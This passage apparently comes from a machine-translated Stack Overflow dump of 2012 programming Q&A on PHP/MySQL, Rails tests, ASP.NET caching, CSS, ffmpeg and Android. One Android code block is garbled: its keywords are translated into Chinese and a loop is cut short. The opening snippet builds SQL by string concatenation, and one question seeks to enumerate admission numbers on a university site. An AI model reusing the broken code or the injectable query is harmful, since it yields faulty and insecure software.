    $query = "SELECT address FROM table WHERE address LIKE '%" . implode( "%' OR address LIKE '%", $arr) . "%' ";
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T16:04:45.163

我建议以下

```
SELECT * FROM table WHERE REPLACE(address, ' ', '') LIKE REPLACE('%$address%', ' ', ''); 
```

这将用非空格替换空格，以便您可以更接近和更轻松地匹配。

# ruby-on-rails - Capybara 不遵循重定向和更改数据库

> ID：11702488
> 
> 赞同：1
> 
> 时间：2012-07-28T15:53:53.223
> 
> 标签：ruby-on-rails, ruby, redirect, rspec, capybara

我有两个失败的规范，似乎有些相关。他们是这样的：

```
describe "exclude from navigation button" do
  before do
      within "#page_#{pages[1].id}" do
      click_link I18n.t 'pages.exclude'
    end
    pages[1].reload
  end
  specify { pages[1].menu_order.should == -1 }
  it "should add an excluded css class to the pages control" do
    page.should have_selector "li.excluded#page_#{pages[1].id}"
  end
end

describe "include in navigation button" do
  before do
    within "#page_#{pages[2].id}" do
      click_link I18n.t 'pages.include'
    end
    pages[2].reload
  end
  specify { pages[2].menu_order.should == 1 }
  it "should remove the excluded css class from the pages control" do
    page.should_not have_selector "li.excluded#page_#{pages[2].id}"
  end
end 
```

两个 describe 块在使用`expected css "..." (not) to return (any|some)thing`.

这是 click_link 操作的控制器代码：

```
def exclude_page
  page = Page.find params[:page_id]
  Hierarchy::PageHierarchy.exclude! page
  redirect_to admin_pages_path
end

def include_page
  page = Page.find params[:page_id]
  Hierarchy::PageHierarchy.include! page
  redirect_to admin_pages_path
end 
```

这些是模块方法排除！并包括！：

```
def self.exclude! page
  page.update_attribute :menu_order, -1
end

def self.include! page
  page.update_attribute :menu_order, 1
  menu_order = 2
  page.siblings.each do |p|
    p.update_attribute :menu_order, menu_order unless p.menu_order == -1
    menu_order += 1
  end
end 
```

这是重定向目标的控制器代码（`admin_pages_path`）：

```
def index
  @pages = Page.roots
end 
```

其中 Page.roots 是`where parent_id: nil`.

第一个示例块很容易修复。我只需要重新访问页面和 CSS 匹配。但是 afaik Capybara 应该只遵循重定向。那我为什么要重温？

第二个块更难（如果这值得自己提出问题，请打我，我只是想避免重复发布所有代码。）

这次重新访问该页面将无法解决问题。事实上重访似乎改变了数据库：

```
 69:       end
    70:       pages[2].reload
    71:     end
    72:     its(:menu_order) { should == 1}
    73:     it "should add an excluded css class to the pages control" do
 => 74:       binding.pry
    75:       page.should_not have_selector "li.excluded#page_#{pages[2].id}"
    76:     end
    77:   end
    78: end

[1] pry(#<RSpec::Core::ExampleGroup::Nested_1::Nested_2>)> pages[2].id
=> 9
[2] ... > Page.find(9).menu_order
=> 1
[3] ... > visit admin_pages_path
=> nil
[4] ... > Page.find(9).menu_order
=> -1 
```

这是我感到困惑的地方。所以我不明白的是： - 为什么我必须在第一个示例块中重新访问？- 为什么这个技巧在第二个示例块中不起作用？- 为什么重新访问页面会改变数据库？

请注意，所有这些仅适用于 Capybara/RSpec。使用浏览器手动执行此操作时，一切正常。

更新：

页面定义：

```
let(:pages) { bunch_of_pages.sort { |a, b| a.menu_order <=> b.menu_order } }

# bunch_of_pages:
def bunch_of_pages
  pages = []
  roots << root1 = FactoryGirl.create(:public_page, menu_order: (rand*1000).to_i)
  child1 = FactoryGirl.create :public_page, parent: root1, menu_order: (rand*1000).to_i
  child2 = FactoryGirl.create :public_page, parent: root1, menu_order: (rand*1000).to_i
  subchild1 = FactoryGirl.create :public_page, parent: child2, menu_order: (rand*1000).to_i

  pages << root2 = FactoryGirl.create(:public_page, menu_order: (rand*1000).to_i)
  child3 = FactoryGirl.create :public_page, parent: root2, menu_order: (rand*1000).to_i
  .
  .
  .

  pages
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T07:44:46.320

不知道为什么您的测试在不重新加载页面的情况下无法通过。但是，编写第二个示例的正确方法是：

```
page.should have_no_selector "li.excluded#page_#{pages[2].id}" 
```

Capybara 的断言有一个内置机制，可以在匹配失败之前重试特定次数。它仅在您使用`should`而不是`should_not`.

# c# - 如何在没有全局变量的情况下一直保留我的变量？

> ID：11702497
> 
> 赞同：0
> 
> 时间：2012-07-28T15:54:46.017
> 
> 标签：c#, asp.net, optimization

我有两个 GridView。我有`GetGeneralDiagnosis`返回所有诊断列表的方法：

代码诊断
F50 进食障碍
F51 非器质性睡眠障碍

和`GetSpecificDiagnosis`返回更具体列表的方法：

代码诊断
F50.0 神经性厌食
F50.1 非典型神经性厌食
F51.0 非器质性失眠
F51.1 非器质性嗜睡

现在我有了根据第一个 GridView 的 GENERAL DIAGNOSIS 将 SPECIFIC DIAGNOSIS 绑定到第二个 GridView 的方法。

```
protected void gvGeneralDiagnosis_SelectedIndexChanged(object sender, EventArgs e)
{
    string generalDiagnosis = gvGeneralDiagnosis.DataKeys[gvGeneralDiagnosis.SelectedIndex].Values["ICD10Code"].ToString(); 
    var ICD10 = Visit.GetSpecificDiagnosis();   // here I'm getting data from database
    gvSpecificDiagnosis.DataSource = ICD10.Where(i => i.ICD10Code.Contains(generalDiagnosis)).Select(i => new { i.ICD10Name, i.ICD10Code });
    gvSpecificDiagnosis.DataBind();
} 
```

每次更改所选索引时，我都不想连接到数据库。

我怎样才能只得到我的清单`var ICD10 = Visit.GetSpecificDiagnosis()`一次？我听说全局变量是一个非常糟糕的主意，那么我该如何以另一种方式做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:02:01.237

您可以让您的`Visit`类缓存返回的数据。

当`GetSpecificDiagnosis`被调用时，它将检查该数据是否已经从数据库中检索到，如果是则返回。如果不是，它将从数据库中检索它并将其保存到其缓存中。

您应该注意的一件事是这些数据是静态的（即在应用程序的整个生命周期中永远不会改变）还是动态的。在第一种情况下，您不必进行任何特殊处理，但如果是后者，则必须使缓存无效，因为数据库中的信息已更改。

我建议您在[这里](http://msdn.microsoft.com/en-us/library/aa478965.aspx)查看如何开始使用 ASP.NET 中的缓存。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:08:30.670

您可以使用私有成员变量。只要包含它的类存在，这个就“存在”。用属性包装它以访问它并在必要时自动从数据库中读取它。

```
private TypeOfICD10 _icd10;
private TypeOfICD10 ICD10
{
    get
    {
        if (_icd10 == null) { // Get from database.
            _icd10 = Visit.GetSpecificDiagnosis();   
        }
        return _icd10;
    }
} 
```

现在你可以像这样使用它，它只会在第一次调用时从数据库中读取

```
protected void gvGeneralDiagnosis_SelectedIndexChanged(object sender, EventArgs e)
{
    string generalDiagnosis = gvGeneralDiagnosis.DataKeys[gvGeneralDiagnosis.SelectedIndex].Values["ICD10Name"].ToString();
    gvSpecificDiagnosis.DataSource = ICD10
        .Where(i => i.ICD10Code.Contains(generalDiagnosis))
        .Select(i => new { i.ICD10Name, i.ICD10Code });
    gvSpecificDiagnosis.DataBind();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:13:22.810

我对您的问题中的 Visist 类了解不多，但为什么不以这种方式缓存 ICD10，您将使用缓存的对象，并且仅当缓存键 ICD10 的值为 null 时才会进行数据库调用

**例子 ：**

```
if(Cache["ICD10"] == null)
{
 var ICD10 = Visit.GetSpecificDiagnosis();
 Cache["ICD10"] = ICD10;
}
else
{
var ICD10 =  Cache["ICD10"];
} 
```

# c# - 创建新 WPF 应用程序的 WPF 应用程序（开发环境）

> ID：11702501
> 
> 赞同：0
> 
> 时间：2012-07-28T15:55:30.693
> 
> 标签：c#, wpf, development-environment

我有兴趣在 WPF 中创建一个开发环境，它可以帮助非程序员（如父母）用 C# 为儿童编写简单的程序。所以，我想制作一个 WPF 应用程序（开发环境）来创建一个新的 WPF 应用程序。这是不可能的，对吧？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:12:16.193

有一个简单的方法可以证明这样做并非不可能：找到一些可以创建新 WPF 应用程序的现有应用程序。但这正是 Visual Studio 所做的。

所以，不，这*不是*不可能的。

如果您想知道这样做是否*容易*，那是完全不同的问题。

# html - ie7浮动表左侧行不起作用

> ID：11702504
> 
> 赞同：0
> 
> 时间：2012-07-28T15:56:02.033
> 
> 标签：html, css, internet-explorer-7

我正在处理无法编辑的表格，无法添加任何 HTML，无法添加任何 JS。一切都已预先生成，我所能做的就是向其中添加 CSS。

所以表格有两行，一是侧边栏，二是中心内容。我想将侧边栏设为 210px 宽并将其向左浮动，就像我将内容居中一样。除了 IE7，所有浏览器都可以正常工作。当我使用 IE7 开发人员工具检查它时，我可以看到它下面的行和 TD 总是 100% 宽，并且无法为其分配宽度值。

有解决这个问题的方法吗？

示例代码。

```
<table>
<tr id="sidebar"><td>Some data</td></tr>
<tr id="main"><td>Some data 2</td></tr>
</table>

CSS:
#sidebar
{
display:block;
width:210px;
float:left;
}
#main
{
display:block;
width:730px;
float:left;
} 
```

请指教

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:38:28.150

我没有ie7，但设置行显示：表格单元；在这个例子中，在桌子上放一个宽度在 chrome 中工作。[http://jsfiddle.net/jalbertbowdenii/7Wuku/](http://jsfiddle.net/jalbertbowdenii/7Wuku/)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-07-28T16:09:33.067

我认为这样做的一个好方法是没有第二行......当然，如果你可以像这样制作你的标记：

```
<table>
    <tr>
        <td id="sidebar">Sidebar content</td>
        <td class="main_cont">Main content</td>
    </tr>
</table> 
```

在这个标记中，您不需要浮动`td`s，只需说明宽度。一个活生生的例子在这里：http: [//jsfiddle.net/skip405/QySz2/1/](http://jsfiddle.net/skip405/QySz2/1/)

但是如果你不能改变标记——恐怕你永远不会教 IE7 浮动表格行））

# web-services - 自动从网站检索数据

> ID：11702506
> 
> 赞同：0
> 
> 时间：2012-07-28T15:56:23.143
> 
> 标签：web-services, authentication, web-applications, automation

抱歉，如果这听起来像是一个初学者问题，我必须从[http://admissions.giki.edu.pk/confirmfee.php](http://admissions.giki.edu.pk/confirmfee.php)检索一些数据，但事实证明您需要为此输入您的录取卡号。有没有办法可以自动输入大量数字并访问数据？如果这个问题不够清楚，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T07:29:52.853

通过 $_POST 形成。当然，您可以创建一个具有 action=? 的表单。直接到页面，如果你只是想得到一个值。如果您想远程提取数据...

如果你擅长 HTTP/1.1，fsockopen() 会做你想做的事

curl() 也可以工作（并且对用户更友好），但速度稍慢。

前任; 使用 fsockopen()

[https://stackoverflow.com/a/4609497/1377321](https://stackoverflow.com/a/4609497/1377321)

# google-maps - 谷歌地图显示错误的当前位置

> ID：11702507
> 
> 赞同：0
> 
> 时间：2012-07-28T15:56:23.610
> 
> 标签：google-maps, sencha-touch-2

我在我的 sencha touch 应用程序中使用谷歌地图。我正在使用当前位置作为真实。但有时我的当前位置有时会有所不同。

下面是我用来显示地图的代码。

```
 this.map = new Ext.Map({
    mapOptions : {
        zoom: 12,
        navigationControlOptions: {
            style: google.maps.NavigationControlStyle.DEFAULT
        }
    },
    useCurrentLocation: true,
}); 
```

# php - 使用用户函数从 mysql 返回结果

> ID：11702509
> 
> 赞同：0
> 
> 时间：2012-07-28T15:56:35.860
> 
> 标签：php, arrays, loops

请告诉，为什么这个代码是错误的？

```
function myres () {
   $db = new mysqli("localhost","userrr","pass","mvc");
   $res = $db->query("SELECT * FROM news ");
   return $res;
}

while ($row = myres()->fetch_row()) {
    echo  $row[0];
} 
```

PS此代码正在运行：

```
$db = new mysqli("localhost","userrr","pass","mvc");
$res = $db->query("SELECT * FROM news ");
while ($row = $res->fetch_row()) {
    echo  $row[0];
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:00:16.353

你`myres()`每次都来这里，我想：

```
while ($row = myres()->fetch_row()) {
  echo  $row[0];
} 
```

所以每次都`$row`包含结果的第一行，并且不会停止。我认为它会很好地工作：

```
$res = myres();

while ($row = $res->fetch_row()) {
  echo  $row[0];
} 
```

# macos - 在 Mac OS x 中使用来自 www-user 和控制台的 dir

> ID：11702510
> 
> 赞同：0
> 
> 时间：2012-07-28T15:56:40.520
> 
> 标签：macos, symfony, console, chmod

我安装 Symfony 并执行以下操作：

```
chmod -R 777 app/cache app/log 
```

从浏览器打开 - 一切都很好！当转到控制台并执行以下操作时：

```
php app/console cache:clear 
```

并得到错误我没有删除文件的权限。好的，我会用 sudo 来做：

```
sudo php app/console cache:clear 
```

伟大的！但...

在浏览器中我得到：

```
RuntimeException: Failed to write cache file 
```

请

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T19:08:50.160

Probably you should do 2 things:

1.  Make sure that you are running you web-server from the same user as you are.
2.  Change owner or permission to the directory, in which your project is stored.

I'll explain point 2 little deeply.

Usually you create projects in `/var/www` folder. So, `sudo chmod -R 755 /var/www` would fix your issue.

P.S. Next time you should provide more details on your configuration setup. At least, some `ls -l` and `pwd` would help us to give you proper answer faster.

Cheers ;)

# ruby - 获取元素的位置/位置

> ID：11702515
> 
> 赞同：2
> 
> 时间：2012-07-28T15:57:22.127
> 
> 标签：ruby, watir

我使用 watir-webdriver 并尝试找到像`$browser.div(:id, "foo")`. 当我尝试点击它时，chromedriver 说

> 元素在点不可点击（-1707，-799.5）

如何获得元素的这个坐标？我试过这个：

[http://wiki.openqa.org/display/WTR/Right+Click+an+Element](http://wiki.openqa.org/display/WTR/Right+Click+an+Element)

但是当我尝试调用该`document()`方法时出现错误。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-30T13:45:54.300

我假设您使用的是 Watir-Webdriver，因为您使用的是 Chromedriver。你参考的文章其实是针对Watir的，和Watir-Webdriver并不总是一样的。

要获取元素的位置，可以使用以下`Element#location`方法：

```
location = browser.element(:id, 'id').location
puts "location x = #{location.x}"
puts "location y = #{location.y}" 
```

请注意，旧版本的 Watir-Webdriver 没有此方法。相反，您需要直接访问底层的 Selenium::WebDriver：

```
location = browser.element(:id, 'id').wd.location
puts "location x = #{location[0]}"
puts "location y = #{location[1]}" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-23T07:22:23.833

我认为位置（.wd.location）是浏览器页面范围内的相对位置，而不是系统屏幕的绝对位置。

比如说，当您的浏览器最大化时，它会得到 (700, 300)。但随着您的浏览器移动，它会得到 (500,200)....

我得到了一个按钮的“wd.location”，然后从 Autoit“autoit.MouseClick("left", x, y)" 发送了一个鼠标单击事件。我发现鼠标不在按钮上了。我必须添加一个偏移量来修复它，但真正的问题是偏移量会随着我的浏览器位置而变化......

# php - 有没有一个php模板引擎可以像asp.net一样工作

> ID：11702520
> 
> 赞同：0
> 
> 时间：2012-07-28T15:57:45.807
> 
> 标签：php, templates, templating-engine

像 smart 这样的 PHP 模板引擎只为我们设计页面提供了一个 extends 方法。在 asp.net 中，我们可以扩展（使用母版页），也可以创建用户控件并在一个页面中包含不同的用户控件。有没有一个PHP模板引擎可以做这样的工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:02:13.960

看看 Smarty [http://www.smarty.net](http://www.smarty.net)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:34:42.427

一个非常好的和现代的 php 模板引擎是[twig](http://twig.sensiolabs.org/)

# java - 有没有一种方法可以使用一个“匹配”功能检查多个条件？

> ID：11702521
> 
> 赞同：0
> 
> 时间：2012-07-28T15:58:11.223
> 
> 标签：java, string

考虑以下语句：

```
if(UserAgent.matches("iPhone")) 
```

我必须检测用户是通过手机还是 PC 在线。为此，我需要检查大量移动设备、浏览器。而不是写相同的部分：

```
if(UserAgent.matches()) 
```

有什么方法可以使用 on`matches`函数检查这个吗？我的意思是说使用`|`哪个是OR。像 ：

```
UserAgent.matches(SOME MODIFICATION "iPhone" | "Android" | "Blackberry".....) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:06:11.193

实际上， String.matches() 是作为正则表达式匹配的，所以你可以写类似

```
if (UserAgent.matches("iPhone|Android|Blackberry")) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:01:42.623

将所有字符串放入一个集合中，然后检查 UserAgent 字符串是否包含在该集合中。

```
if set.contains(UserAgent.toString())
    // do something
end 
```

# linux - ffmpeg 使用 - 四核仍然超载

> ID：11702523
> 
> 赞同：1
> 
> 时间：2012-07-28T15:58:21.803
> 
> 标签：linux, encoding, ffmpeg, streaming

我有一个 3.2GHz 四核 Xeon E3-1230 CPU，Passmark CPU 分数为 8,200，32GB 内存——我不能在不超载的情况下执行超过 4 个 ffmpeg 命令/会话。当我执行 ffmpeg 会话时，它告诉我它没有使用多个核心，只有一个。这是为什么？如何让 ffmpeg 充分利用我拥有的所有 cpu 内核？

提前感谢您的任何建议。

ffmpeg 版本：

```
ffmpeg version N-42487-gfedefe4-syslint Copyright (c) 2000-2012 the FFmpeg developers
  built on Jul 13 2012 23:18:33 with gcc 4.1.2 20080704 (Red Hat 4.1.2-52)
  configuration: --prefix=/usr/local/cpffmpeg --enable-shared --enable-nonfree --enable-gpl --enable-pthreads --enable-libopencore-amrnb --enable-decoder=liba52 --enable-libopencore-amrwb --enable-libfaac --enable-libmp3lame --enable-libtheora --enable-libvorbis --enable-libx264 --enable-libxvid --extra-cflags=-I/usr/local/cpffmpeg/include/ --extra-ldflags=-L/usr/local/cpffmpeg/lib --enable-version3 --extra-version=syslint
  libavutil      51\. 64.100 / 51\. 64.100
  libavcodec     54\. 37.100 / 54\. 37.100
  libavformat    54\. 16.104 / 54\. 16.104
  libavdevice    54\.  1.100 / 54\.  1.100
  libavfilter     3\.  2.100 /  3\.  2.100
  libswscale      2\.  1.100 /  2\.  1.100
  libswresample   0\. 15.100 /  0\. 15.100
  libpostproc    52\.  0.100 / 52\.  0.100
Hyper fast Audio and Video encoder 
```

# windows - Golink 是否需要对符号名称进行修饰？

> ID：11702524
> 
> 赞同：0
> 
> 时间：2012-07-28T15:58:31.083
> 
> 标签：windows, assembly, x86, nasm

好的，所以我正在使用 NASM 组装代码并与 Golink 链接。我一直在直接通过 DLL 使用 Windows API 调用和 C 调用。例如，kernel32.dll 用于类似 ExitProcess 的东西，msvcrt.dll 用于类似 printf 的东西。但是，当我尝试使用这样的装饰时，**_ExitProcess@4**或**_printf** golink 抱怨装饰并建议使用**/mix**标志。当我使用它时，Windows 抱怨输出文件不是有效的 win32 程序。当我不使用装饰品时，它工作得很好。谁能解释一下怎么回事？

例子：

```
extern printf
extern ExitProcess
;A bunch of code which isn't really important to this 
```

然后我的命令：

```
nasm -fwin32 test.asm
golink test.obj kernel32.dll msvcrt.dll /console /entry _start 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T22:36:07.727

我使用 Nasm，但不在 Windows 中，所以我对 GoLink 不是很熟悉。我认为它在内部添加了“装饰”。它可能需要前导下划线。如果您在命令行上使用“--prefix _”，Nasm 会将其添加到任何外部/全局内容中。

仔细阅读错误消息可能会让您对 GoLink 的预期有所了解。尝试直到试验>错误。:)

最好的，弗兰克

# java - 使用 JSON 的长轮询不起作用

> ID：11702526
> 
> 赞同：0
> 
> 时间：2012-07-28T15:58:34.573
> 
> 标签：java, javascript, json, jquery, client-server

我正在尝试在 Google 应用引擎服务器上构建具有长轮询机制的聊天应用程序。HTTPRequest 的默认时间为 30 秒，因此如果服务器没有更新，我每 28 秒向服务器发送一次轮询请求（这样我就不会错过来自其他客户端的任何消息）。第一个请求已注册，但 28 秒后发送的第二个请求未到达服务器。

```
function loadPage(query){
$.get({ url: query, success: function(events){
   updated = 1;
   //events data processing
   createServerChannel();
     });
}

  function createServerChannel(){
      var query='/ChatController?&user='+userName+'&sessionName='+sessionName+'&register=true';
      loadPage(query);
      updated = 0;
      setInterval(function() { poll(query); }, 28000);
   };

   function poll(query){
       if(updated==0){
          loadPage(query);
       }
   } 
```

我正在使用 thread.wait() 请求在服务器上等待。当来自同一客户端的下一个请求可用时，是否有任何方法可以使用第一个挂起的请求。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T18:22:38.357

我认为 Web 套接字可能是一种更好的方法，因为它可以保持与服务器的连续连接并等待服务器将数据推送到客户端。

[http://www.html5rocks.com/en/tutorials/websockets/basics/](http://www.html5rocks.com/en/tutorials/websockets/basics/)

# html - 如何同时使用固定和可伸缩的 CSS 内容

> ID：11702536
> 
> 赞同：0
> 
> 时间：2012-07-28T16:00:10.753
> 
> 标签：html, css, width, stretch

[我正在尝试使用固定宽度和有弹性的 CSS 内容，类似于在Google Calendar](https://www.google.com/calendar/)上看到的内容。我认为使用 min-width 和 max-width 很容易实现这一点，但是我遇到了简单地坚持最小宽度而不是拉伸到最大值的子元素的问题。

可以在[这里](http://jsfiddle.net/QDvtW/10/)看到一个演示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:28:57.153

无论如何，您实际上不需要设置最小/最大宽度。

[http://jsfiddle.net/UyZ6T/1/](http://jsfiddle.net/UyZ6T/1/)

问题基本上是`float: left;`在stretch-1上。你只需要在固定尺寸的部分。它的基本意思是：“我现在在左边，其他一切都在右边”。具有 float 属性的 div 会尝试占用尽可能少的空间，以便其余部分可以拉伸。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:34:52.813

从. `float:left`_ [小提琴](http://jsfiddle.net/QDvtW/20/)`#stretch-1`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:43:37.623

您实际上是在尝试创建一个包含固定宽度元素的流体布局，您需要在所有父元素上设置百分比宽度，以使其像谷歌日历一样工作 - 将您的 css 更改为以下

```
#container {
max-width:1280px;
min-width:260px;
    width:90%;
height:200px;
margin:auto;
background:#000;
}

#fixed-1 {
width:200px;
height:200px;
float:left;
background:#3fb44a;
}

#stretch-1 {
min-width:60px;
    width:20%;
height:200px;
float:left;
background:#c44d58;
}

#sub-content {
width:100%;
height:20px;
background:#4788ef;
} 
```

​</p>

# ios - 如何在 iOS 上监听系统复制事件？

> ID：11702540
> 
> 赞同：-1
> 
> 时间：2012-07-28T16:00:36.727
> 
> 标签：ios, cocoa

我看到有一个这样的程序：

[http://vimeo.com/44396882](http://vimeo.com/44396882)

程序可以监听iOS的copy事件，对程序盲信息？程序实际上在后台是怎么做的？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T17:28:34.670

我假设您指的是用户复制文本，对吗？好吧，您不能劫持设备，以便您的应用程序无论用户在哪里都能接收这些事件，但是您**可以**`"UIPasteboardChangedNotification"`在用户使用您的应用程序时通过注册通知来收听这些事件。

如果此通知是在您的应用程序处于后台时发布的，它应该会在它回到前台后收到它。我从以下假设：

![在此处输入图像描述](../Images/0abb727025e09300d6bb610b3ad9534e.png)

更多信息[在这里](http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIPasteboard_Class/Reference.html)

# javascript - css / html - 不换行等效于 div / 元素容器的自动宽度

> ID：11702541
> 
> 赞同：0
> 
> 时间：2012-07-28T16:00:57.663
> 
> 标签：javascript, html, css

我有一个图像滑块/查看器，其中包含一堆图像的绝对定位的 div 位于固定宽度的相对 div 内。问题是图像在绝对定位的 div 中一个在另一个下方，而不是在水平方向上彼此相邻 - 即使它们被赋予属性 float:left; - 如何防止它们换行（类似于通过 no-wrap 属性防止文本这样做？我可以给绝对定位的 div 一个包含其所有元素的宽度属性，而不通过 javascript 计算该宽度吗？这是代码：

```
<div id="homeSlider" style="width:800px; position:relative;">
    <div id="homeSlides" style="position:absolute;">
        <img class="homeSlide" src="images/temp-portfolio.jpg" alt="Portfolio Item"/>
        <img class="homeSlide" src="images/temp-portfolio.jpg" alt="Portfolio Item"/>
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:19:16.130

最简单的事情（如果可能的话）是将`img`项目设置为`display: inline-block`，然后将其设置`homeSlides`为 have ，然后一起`white-space: nowrap`避免。`float`

[**见小提琴。**](http://jsfiddle.net/RXEwQ/1/)

# objective-c - 如何显示多个子视图？

> ID：11702542
> 
> 赞同：1
> 
> 时间：2012-07-28T16:01:27.747
> 
> 标签：objective-c, ios

我遇到了我认为有点像新手的问题......我制作了一个动态滚动视图，其中图像和标签以编程方式添加为子视图。问题是只显示我添加为子视图的最后一个。此外，当我读到“addSubview：”时，它会说“将视图添加到接收者的子视图列表的末尾”。这是否意味着只显示最后添加的子视图？在那种情况下，我如何使两者都可见？

在此先感谢，汤姆

代码：

```
for(int i = 0; i < [famorableArray count]; i++){

    UIButton *famorableButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    [famorableButton setFrame:CGRectMake(0.0f, 5.0f, 57.0f, 57.0f)];
    [famorableButton setImage:personLogo forState:UIControlStateNormal]; 

    NSString *famString = [NSString stringWithFormat:@"%@", [[[famorableArray objectAtIndex:i] substringFromIndex:8] capitalizedString]];
    NSLog(@"%@", famString);
    UILabel *famLabel = [[UILabel alloc] initWithFrame:CGRectZero];
    famLabel.text = famString;
    NSLog(@"Test2 %@", famLabel.text);

    // Move the buttons position in the x-demension (horizontal).
    CGRect btnRect = famorableButton.frame;
    btnRect.origin.x = totalButtonWidth;
    [famorableButton setFrame:btnRect];

    CGRect labelRect = famLabel.frame;
    labelRect.origin.x = totalButtonWidth + 28.5f;
    [famLabel setFrame:btnRect];

    // Add the button to the scrollview
    [famScroll addSubview:famLabel];
    [famScroll addSubview:famorableButton];

    // Add the width of the button to the total width.
    totalButtonWidth += famorableButton.frame.size.width + 30;

}
[famScroll setContentSize:CGSizeMake(totalButtonWidth, 79.0f)]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:13:29.900

对于每个添加的子视图，您必须设置`frame`属性。框架是视图在父视图中的位置。“添加到子视图列表”并不意味着任何自动布局。所以我假设你所有的子视图都是可见的但重叠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T13:24:41.980

我的错...复制粘贴后编辑失败。不小心将 btnRect 用作​​标签的框架。无论如何感谢您的努力@Martin :)

# php - filemtime() 在执行期间保持不变，尽管文件发生了变化

> ID：11702553
> 
> 赞同：6
> 
> 时间：2012-07-28T16:02:37.610
> 
> 标签：php, filemtime

尝试运行

```
<?php
  echo filemtime("test.txt")."\n";
  sleep(4);
  file_put_contents("test.txt", "test");
  echo filemtime("test.txt")."\n";
?> 
```

对我来说，命令行打印：

```
1343490984
1343490984 
```

这不可能是对的，不是吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-07-28T16:05:20.840

从[`filemtime`文档](http://php.net/filemtime)中：

> **注意：**此函数的结果被缓存。有关[`clearstatcache()`](http://php.net/clearstatcache)更多详细信息，请参阅。

您需要在再次致电`clearstatcache()`之前致电`filemtime()`：

```
echo filemtime("test.txt")."\n";
sleep(4);
file_put_contents("test.txt", "test");
clearstatcache();
echo filemtime("test.txt")."\n"; 
```

# android - 在 ActivityGroup 中单击微调器时出现 BadTokenException

> ID：11702554
> 
> 赞同：1
> 
> 时间：2012-07-28T16:02:52.073
> 
> 标签：android, tabs, spinner, activitygroup

我现在搜索了两天的解决方案，但我没有找到可行的方法。

我有一个带有 4 个选项卡的 TabHost，更改可以将视图从第一个选项卡更改为另一个我有微调器的选项卡。该微调器已正确初始化，但我无法单击它，因为如果这样做，我会收到 BadTokenException

```
07-28 13:52:59.446: E/AndroidRuntime(692): android.view.WindowManager$BadTokenException: 无法添加窗口——令牌 android.app.LocalActivityManager$LocalActivityRecord@405496d8 无效；您的活动正在运行吗？

```

现在开始编码：

```
viewToLoad = LayoutInflater.from(this).inflate(R.layout.projekt_daten, null);
        this.setContentView(viewToLoad);
```

要了解一些变量我的函数调用

```
FuelleSpinner("SELECT _id, name FROM kunden", R.id.s_kundenauswahl);
```

所以我填充微调器：

```
私人无效fuelleSpinner（字符串选择，int spinnerID）{

    光标 spinnerCursor = mDatenbank.rawQuery(selection, null);
    spinner = (Spinner) findViewById(spinnerID);
    字符串[] 数据 = 新字符串[spinnerCursor.getCount()];

    for(int i = 0; i 适配器 =
        新的 ArrayAdapter(getParent(), android.R.layout.simple_spinner_item, data);

    adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
    spinner.setAdapter（适配器）；
}
```

我也试过这个：

```
ArrayAdapter 适配器 = ArrayAdapter.createFromResource(
                getParent(), R.array.array_name, android.R.layout.simple_spinner_item);
```

两种方式都正确初始化微调器，但如果我单击微调器，应用程序会崩溃。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-30T07:02:06.537

试试这个代码。

```
View viewToLoad = LayoutInflater.from(this.getParent()).inflate(R.layout.XXXX, null);
        this.setContentView(viewToLoad); 
```

# android - Android：MapView 投影不准确

> ID：11702556
> 
> 赞同：0
> 
> 时间：2012-07-28T16:03:25.333
> 
> 标签：android, android-mapview, point, projection

由于一些计算，我必须将 GeoPoint 转换为屏幕坐标，对它们进行处理，然后将它们转换回 GeoPoint。

可悲的是，在这些转换之后，新的 GeoPoint 总是距离我想要的点 0-2 毫米（在屏幕上）。

令人惊讶的是，以下代码行已经稍微改变了 GeoPoint。

```
Projection projection = map.getProjection(); 
Log.d("bevore", geoPoint.getLatitudeE6() +" "+geoPoint.getLongitudeE6());
Point pt = new Point();

projection.toPixels(geoPoint, pt);

geoPoint = projection.fromPixels(pt.x, pt.y);
Log.d("after", geoPoint.getLatitudeE6() +" | "+geoPoint.getLongitudeE6()); 
```

输出是：

```
 D/bevore(31252): 53106803 | 8852244
 D/after(31252): 53106802 | 8852240 
```

有没有办法改善这种不准确性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T12:29:48.060

我还没有尝试过，但是您可以在将地理点转换为像素之前尝试将其乘以 10 或 100，这样当您四舍五入到 E6 时，您的错误就会减少。我希望它会帮助你。

* * *

